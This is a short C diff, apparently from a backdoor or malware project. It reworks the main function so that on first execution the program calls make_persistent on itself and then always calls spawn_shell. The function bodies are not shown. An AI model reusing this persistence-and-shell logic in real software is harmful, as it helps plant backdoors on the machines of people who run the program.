@@ -13,12 +13,7 @@ int main(int argc, char** argv){
 
 
 	if(is_first_exec(argv[0])){
-		if(make_persistent(argv[0])){
-			spawn_shell(true); // true to signal persistency
-		}else{
-			printf("persitent\n");
-			spawn_shell(false);
-		}
+		make_persistent(argv[0]);
 	}
 
 	spawn_shell(true);
